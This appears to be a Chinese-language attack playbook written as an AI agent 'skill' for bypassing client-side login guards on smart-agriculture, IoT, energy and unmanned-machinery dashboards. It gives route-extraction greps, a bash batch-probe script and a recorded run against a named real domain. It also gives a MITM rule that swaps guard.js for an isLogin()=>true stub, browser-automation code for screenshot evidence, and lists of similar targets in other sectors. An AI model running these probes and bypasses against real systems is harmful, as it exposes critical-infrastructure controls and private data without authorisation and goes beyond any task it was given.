# 大屏 / IOT / 能源 / 无人机械 暴露面清单

> 适用技能:route-guard-bypass
> 适用场景:静态扫描后定位需要截图取证的具体页面,按震撼度排序

---

## 一、目标优先级矩阵

### 1.1 按震撼度排序

| 优先级 | 类别 | 危害类型 | 客户关注度 |
|---|---|---|---|
| ⭐⭐⭐⭐⭐ | **IOT 设备管理** | 控制物理设备(传感器/控制器/PLC) | 🔴 CRITICAL — 影响生产 |
| ⭐⭐⭐⭐⭐ | **无人机械** | 控制拖拉机/收割机/无人机/无人船 | 🔴 CRITICAL — 物理设备控制 |
| ⭐⭐⭐⭐⭐ | **能源监控** | 箱变/变压器/负荷曲线/光伏储能 | 🔴 CRITICAL — 关键基础设施 |
| ⭐⭐⭐⭐⭐ | **产业园大屏** | GIS 地图/经营主体/产值分布 | 🟠 HIGH — 商业情报 |
| ⭐⭐⭐⭐ | **产业大屏(粮油/蔬菜/花卉等)** | 产业链/产值/品牌分布 | 🟠 HIGH — 行业情报 |
| ⭐⭐⭐⭐ | **应急指挥/防汛抗旱** | 实时态势/预警/资源调度 | 🔴 CRITICAL — 应急指挥 |
| ⭐⭐⭐⭐ | **环境监测(空气/水质/土壤)** | 实时数据/超标预警 | 🟠 HIGH — 监管数据 |
| ⭐⭐⭐ | **BI 综合展示** | KPI 报表/经营分析 | 🟡 MEDIUM |
| ⭐⭐⭐ | **设备档案/台账** | 设备列表/维保记录 | 🟡 MEDIUM |
| ⭐⭐ | **用户/权限管理** | 用户列表/角色/部门 | 🟡 MEDIUM |

### 1.2 按数据敏感性排序

| 优先级 | 数据类型 | 示例 |
|---|---|---|
| 🔴 P0 | 控制指令(开/关/调节) | IOT 设备控制、无人机械启停 |
| 🔴 P0 | 实时监测数据 | 电力负荷、设备温度、土壤湿度 |
| 🟠 P1 | 商业经营数据 | 客户名单、合同金额、产业链分布 |
| 🟠 P1 | GIS 坐标数据 | 设备 GPS、园区边界、传感器位置 |
| 🟡 P2 | 历史统计数据 | 月度产量、年度产值 |
| 🟡 P2 | 用户身份信息 | 管理员姓名、手机号 |

---

## 二、典型路由模式

### 模式 1:产业园/产业大屏

**特征**:`index_chengzhen_*` / `index_chanye_*` + GIS 地图 + echarts

**URL 模式**:
```
/index_chengzhen_new.html?address={镇/园区}
  ├─ xibei            (锡北镇)
  ├─ donggang         (东港镇)
  ├─ yangjian         (羊尖镇)
  ├─ ehu              (鹅湖镇)
  ├─ xidongyuwenhua   (锡东文化)
  └─ ...

/index_chanye_new*.html?type={产业类型}
  ├─ liangyou         (粮油)  PropertyClassValue=1
  ├─ shucai           (蔬菜)  PropertyClassValue=2
  ├─ shuiguo          (茶果)  PropertyClassValue=3
  ├─ huahui           (花卉)  PropertyClassValue=4
  ├─ shuichan         (水产)  PropertyClassValue=5
  ├─ zhongye          (种业)  PropertyClassValue=6
  └─ zhongyao         (中药)  PropertyClassValue=7
```

**常见内容**:
- 百度/高德地图 GIS 标记
- echarts 柱状图/饼图/折线图
- 经营主体列表(企业名/法人/规模)
- 产值数据

### 模式 2:IOT 设备管理

**特征**:`index_device.html` / `index_iot*.html` + 设备列表 + 实时数据

**URL 模式**:
```
/index_device.html
/index_iot_sensor.html
/index_iot_controller.html
/index_iot_alert.html
```

**常见内容**:
- 设备列表(名称/编号/位置/状态)
- 实时数据(温度/湿度/电压/电流)
- 控制指令(开关/调节/校准)
- 报警记录

### 模式 3:能源监控

**特征**:`index_use_electricity.html` / `index_energy*.html` + 负荷曲线 + 设备状态

**URL 模式**:
```
/index_use_electricity.html      (用电管理)
/index_energy_overview.html     (总览)
/index_box_transformer.html     (箱变)
/index_pv_storage.html           (光储充)
/index_load_curve.html           (负荷曲线)
```

**常见内容**:
- 实时负荷曲线(功率/电压/电流)
- 设备状态(运行/待机/故障)
- 能耗统计(峰谷平电量)
- 报警记录

### 模式 4:无人机械

**特征**:`index_nobodyMachinery.html` / `index_robot*.html` + 设备控制 + GPS

**URL 模式**:
```
/index_nobodyMachinery.html      (无人机械总览)
/index_robot_tractor.html        (无人拖拉机)
/index_robot_harvester.html      (无人收割机)
/index_robot_drone.html          (无人机)
```

**常见内容**:
- 设备列表/状态(GPS/速度/方向)
- 控制指令(启动/停止/转向/速度)
- 作业轨迹
- 报警记录

### 模式 5:应急指挥/防汛抗旱

**特征**:`index_emergency*.html` / `index_flood*.html` + 实时态势 + 资源调度

**URL 模式**:
```
/index_emergency_command.html    (应急指挥)
/index_flood_control.html        (防汛)
/index_drought_relief.html       (抗旱)
```

**常见内容**:
- 实时态势(雨量/水位/台风路径)
- 资源调度(救援队伍/物资/车辆)
- 预警信息
- 历史事件

### 模式 6:环境监测

**特征**:`index_environment*.html` + 实时数据 + 报警

**URL 模式**:
```
/index_env_air.html              (空气)
/index_env_water.html            (水质)
/index_env_soil.html             (土壤)
/index_env_noise.html            (噪声)
```

**常见内容**:
- 实时数据(PM2.5/COD/氮磷/温度)
- 报警记录
- 历史趋势

---

## 三、JS bundle 路由提取实战

### 3.1 提取模板

```bash
# 大屏/产业园
grep -hoE "(chengzhen|chanye|park|industry|dashboard|screen)\.html[^'\"]*" main-index.js | sort -u

# IOT 设备
grep -hoE "(device|iot|sensor|controller)\.html[^'\"]*" main-index.js | sort -u

# 能源
grep -hoE "(electricity|energy|transformer|pv|load)\.html[^'\"]*" main-index.js | sort -u

# 无人机械
grep -hoE "(nobodyMachinery|robot|tractor|harvester|drone)\.html[^'\"]*" main-index.js | sort -u

# 应急
grep -hoE "(emergency|flood|drought|rescue)\.html[^'\"]*" main-index.js | sort -u

# 环境
grep -hoE "(environment|env|air|water|soil)\.html[^'\"]*" main-index.js | sort -u
```

### 3.2 URL 参数提取

```bash
# 查询参数(address / type / id / code)
grep -hoE "[?&](address|type|id|code|category|class)\s*=\s*['\"][^'\"]+['\"]" main-index.js | sort -u
```

### 3.3 HTTP 批量探针(完整模板)

```bash
#!/bin/bash
# probe_big_screens.sh - 大屏/IOT/能源 批量探针
TARGET="$1"
if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target-domain>"
  exit 1
fi

# 大屏路由
declare -a SCREENS=(
  "/index_chengzhen_new.html?address=xibei"
  "/index_chengzhen_new.html?address=donggang"
  "/index_chengzhen_new.html?address=yangjian"
  "/index_chengzhen_new.html?address=ehu"
  "/index_device.html"
  "/index_use_electricity.html"
  "/index_nobodyMachinery.html"
)

echo "=== 探针目标 ==="
for url in "${SCREENS[@]}"; do
  size=$(curl -sI "http://$TARGET$url" 2>/dev/null | grep -i content-length | awk '{print $2}' | tr -d '\r')
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$url" 2>/dev/null)
  echo "$status  $size  $url"
done
```

### 3.4 实战案例(锡山区农业平台 Round 18)

**输入**:http://www.xishanagripark.com

**输出**(完整 14 个路由全部 200 OK):
```
200  index_chengzhen_new.html?address=xibei           (20944B)
200  index_chengzhen_new.html?address=donggang        (13954B)
200  index_chengzhen_new.html?address=yangjian        (14846B)
200  index_chengzhen_new.html?address=ehu             (18426B)
200  index_chengzhen_new.html?address=xidongyuwenhua  (12061B)
200  index_device.html                                (4660B)  ← IOT
200  index_use_electricity.html                       (5771B)  ← 用电
200  index_nobodyMachinery.html                       (2686B)  ← 无人机械
200  index_chanye_new_ly.html?type=liangyou&PropertyClassValue=1
200  index_chanye_new.html?type=shucai&PropertyClassValue=2
200  index_chanye_new.html?type=shuiguo&PropertyClassValue=3
200  index_chanye_new_zy.html?type=huahui&PropertyClassValue=4
200  index_chanye_new_zy.html?type=huahui&PropertyClassValue=5
200  index_chanye_new_zy.html?type=huahui&PropertyClassValue=6
200  index_chanye_new_zy.html?type=huahui&PropertyClassValue=7
```

**关键发现**:
- ✅ 14 个 HTML 路由全部 200 OK
- ⚠️ HTTP 客户端不执行 JS,200 OK 但浏览器侧 guard.js 拦截
- 🔓 即"完美绕过点":任意用户可访问

---

## 四、截图取证清单

### 4.1 截图优先级矩阵(实战推荐)

| 优先级 | 截图文件名 | URL 路径 | 震撼点 |
|---|---|---|---|
| 🔴 P0 | `iot-device-bypass.png` | /index_device.html | IOT 设备/控制面板 |
| 🔴 P0 | `nobody-machinery-bypass.png` | /index_nobodyMachinery.html | 无人机械/GPS/作业轨迹 |
| 🔴 P0 | `use-electricity-bypass.png` | /index_use_electricity.html | 电力负荷/变压器/报警 |
| 🟠 P1 | `bigscreen-xibei-bypass.png` | /index_chengzhen_new.html?address=xibei | 锡北镇产业园 GIS 大屏 |
| 🟠 P1 | `bigscreen-donggang-bypass.png` | /index_chengzhen_new.html?address=donggang | 东港镇产业园 |
| 🟡 P2 | `industry-liangyou-bypass.png` | /index_chanye_new_ly.html?type=liangyou | 粮油产业 |
| 🟡 P2 | `industry-shucai-bypass.png` | /index_chanye_new.html?type=shucai | 蔬菜产业 |

> **本平台适配说明**：本 skill 原文基于 Claude Code + yakit MCP（`start_mitm_v2` /
> `set_current_rules` 做的是**响应体内容改写**）。本平台 的平台拦截规则
> （`POST /api/intercept/rules`）只做 **allow / deny / ask** 三种放行决策，
> **不能改写响应内容**。要做"把 guard.js 换成无鉴权版本"这类操作，用下面两种方式之一：
>
> 1. **目标侧替换**（推荐）：把改写后的 `guard.js` 存到任务工作目录，用平台请求工具
>    （`fetch`）直接请求该本地文件再投喂给目标页面，或让浏览器加载本地替换版。
> 2. **外部 mitmproxy**：按 `response-modifier` skill 部署 `response_modifier.py`
>    （mitmproxy addon）作为独立进程，再让浏览器指向它的代理端口。
>
> 下面保留原文示例，仅把 MCP 工具名替换为平台等价物，**执行前请按上述说明调整**。

### 4.2 截图 SOP(MITM + js-reverse-mcp)

```python
# 1. 启动 MITM
平台流量录制（任务启动时已自动挂载，无需手动起 MITM）(host="127.0.0.1", port=8080)

# 2. 禁用 guard.js
POST /api/intercept/rules（拦截规则：allow/deny/ask）(rules=[
  {"rule": "http://target/js/guard\\.js",
   "enableForResponse": true,
   "result": "const userStore = { isLogin: () => true };"}
])

# 3. 批量截图
screens = [
  ("/index_device.html", "iot-device-bypass.png"),
  ("/index_use_electricity.html", "use-electricity-bypass.png"),
  ("/index_nobodyMachinery.html", "nobody-machinery-bypass.png"),
  ("/index_chengzhen_new.html?address=xibei", "bigscreen-xibei-bypass.png"),
  ("/index_chengzhen_new.html?address=donggang", "bigscreen-donggang-bypass.png"),
]

for path, filename in screens:
  mcp__browser__navigate(type="url", url=f"http://target{path}")
  mcp__browser__cua_execute(
    function="async () => { await new Promise(r => setTimeout(r, 5000)); return {bodyLen: document.body.innerText.length}; }",
    mainWorld=True
  )
  mcp__browser__tab_screenshot(
    fullPage=True,
    filePath=f"工作目录/evidence/{filename}"
  )
```

### 4.3 截图命名规范

```
evidence/
├── iot-device-bypass.png              # IOT 设备管理(P0)
├── nobody-machinery-bypass.png        # 无人机械(P0)
├── use-electricity-bypass.png         # 能源监控(P0)
├── bigscreen-xibei-bypass.png         # 锡北产业园(P1)
├── bigscreen-donggang-bypass.png      # 东港产业园(P1)
├── bigscreen-yangjian-bypass.png      # 羊尖产业园(P1)
├── bigscreen-ehu-bypass.png           # 鹅湖产业园(P1)
├── industry-liangyou-bypass.png       # 粮油产业(P2)
├── industry-shucai-bypass.png         # 蔬菜产业(P2)
├── industry-shuiguo-bypass.png        # 茶果产业(P2)
├── industry-huahui-bypass.png         # 花卉产业(P2)
└── industry-shuichan-bypass.png       # 水产产业(P2)
```

---

## 五、内容描述模板(报告撰写参考)

### IOT 设备管理

> 该页面为物联网设备管理平台。访问者无需任何登录认证,可查看设备列表、设备状态、实时数据(温度/湿度/电压/电流),并可对设备进行控制操作(开关/调节/校准)。其中包括**关键基础设施控制**(如电力变压器、储能设备),任意用户可执行开关/调节指令,可能造成:
> - 电力系统故障(变压器跳闸/储能设备异常)
> - 农业设施失控(温室/灌溉/通风)
> - 生产设备损坏(传感器误操作/控制指令冲突)

### 无人机械

> 该页面为无人机械管理平台。访问者无需任何登录认证,可查看无人拖拉机/收割机/无人机的实时位置(GPS)、设备状态、作业轨迹,并可发送控制指令(启动/停止/转向/速度调整)。任意用户可:
> - 控制物理设备(影响人身安全)
> - 查看作业轨迹(侵犯隐私)
> - 触发紧急操作(造成经济损失)

### 能源监控

> 该页面为能源管理平台。访问者无需任何登录认证,可查看:
> - 电力负荷曲线(实时功率/历史趋势)
> - 箱变/变压器状态(运行/待机/故障)
> - 光储充系统数据(光伏发电/储能/充电桩)
> - 报警记录
>
> 任意用户可获取关键基础设施运行数据,泄露电力系统信息,可能用于:
> - 电力系统安全分析(国家关键基础设施)
> - 工业生产情报
> - 设备运维漏洞利用

### 产业园大屏

> 该页面为产业园经营数据展示大屏。访问者无需任何登录认证,可查看:
> - GIS 地图(产业园分布/企业位置)
> - 经营主体数据(企业名称/法人/规模)
> - 产值数据(年度产值/产业链分布)
>
> 任意用户可获取商业情报,可能造成:
> - 客户名单泄露(影响企业合作)
> - 商业竞争情报泄露
> - 园区规划情报泄露

---

## 六、行业类似目标清单

| 行业 | 大屏类型 | 路由模式 |
|---|---|---|
| 智慧农业 | 产业园/产业大屏/无人机械 | `index_chengzhen_*` / `index_chanye_*` / `index_nobodyMachinery_*` |
| 智慧园区 | 经营主体/产值/GIS | `dashboard/park_*` / `dashboard/industry_*` |
| 智慧电力 | 能源监控/负荷曲线 | `index_use_electricity_*` / `index_load_*` |
| 智慧水利 | 防汛抗旱/水资源 | `index_flood_*` / `index_water_*` |
| 智慧应急 | 应急指挥/救援调度 | `index_emergency_*` / `index_rescue_*` |
| 智慧环保 | 环境监测/报警 | `index_env_*` / `index_alert_*` |
| 智慧交通 | 车辆/路况/信号 | `index_traffic_*` / `index_signal_*` |
| 智慧医疗 | 设备/药品/床位 | `index_medical_*` / `index_device_*` |
| 智慧校园 | 教学楼/宿舍/食堂 | `index_campus_*` / `index_dorm_*` |
| 智慧政务 | 政务大厅/审批 | `index_gov_*` / `index_approval_*` |